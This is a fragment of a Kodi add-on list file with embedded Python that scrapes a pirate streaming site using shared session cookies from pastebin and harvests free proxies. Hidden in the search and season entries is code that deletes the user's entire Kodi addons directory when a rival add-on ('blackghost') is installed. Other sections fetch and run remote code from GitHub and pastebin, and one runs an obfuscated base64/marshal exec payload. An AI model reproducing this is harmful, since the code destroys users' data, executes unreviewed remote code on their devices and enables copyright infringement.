    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>













<item>
<title>[COLOR gold]* [COLOR lightseagreen]H Series android[COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)class="item tvshows">.*?href="(https://playdede.com/serie.*?)".*?src="(.*?)".*?<p>(.*?)<.*?<h3>(.*?)<.*?span>(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    Palabra_Buscada = xbmcgui.Dialog().input('Buscar Peliculas: ', type=xbmcgui.INPUT_ALPHANUM)
    Palabra_Buscada = six.ensure_str(Palabra_Buscada).replace(" ", "+").replace("á", "a").replace("é", "e").replace("í", "i").replace("á", "a").replace("ú", "u")
    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+'*'+response))
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        anio = item[2]
        titulo = item[3]
        titulo = six.ensure_str(titulo).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>













<item>
<title>[COLOR lightgreen][COLOR white]Ultima proxy prueba  Py3[/COLOR]</title>
<link>$doregex[id3]</link>
<regex>
<name>prueba_proxi</name>
<expres><![CDATA[#$pyFunction
url = 'https://adictosalatele.com/TV/espana/canal-0-plus/'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'http://cdn.sportcast.life/webplayer.php?t=ifr&c=1574935&lang=en&eid=1049841&lid=1574935&ci=215&si=3'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,header=header):

 if not 'http' in url or 'f4m=' in url:
  return url
 else:
  try:
      web_proxy_1 = requests.get('https://api.proxyscrape.com/?request=displayproxies', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_1 = six.ensure_str(web_proxy_1)
      web_proxy1 = re.findall('(\d+.*?:\d+)', web_proxy_1)
  except:
      web_proxy1 = ""
  try:
      web_proxy_2 = requests.get('https://api.chrxw.com/proxy/get_all', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_2 = six.ensure_str(web_proxy_2)
      web_proxy2 = re.findall('(\d+.*?:\d+)', web_proxy_2)
  except:
      web_proxy2 = ""
  try:
      fecha_final = datetime.today().strftime("20%y%m%d")
      dias = str(datetime.fromtimestamp(time.mktime(time.strptime(fecha_final, "%Y%m%d"))) + timedelta(days=-1))
      fecha_nueva = 'https://proxysource.org/en/freeproxies/' + dias[:10]
      proxy_source_response = requests.get(fecha_nueva, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      proxy_source_response = six.ensure_str(proxy_source_response)
      proxy_source_items = re.findall('[,\[]"(\d+.*?:\d+)"', proxy_source_response)
      web_proxy_source = []
      for item in proxy_source_items:
          if item not in web_proxy_source:
              web_proxy_source.append(item)
  except:
      web_proxy_source = ""
  try:
      web_hidemi_response = requests.get('https://hidemy.name/es/proxy-list/?maxtime=1000&type=h#list', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
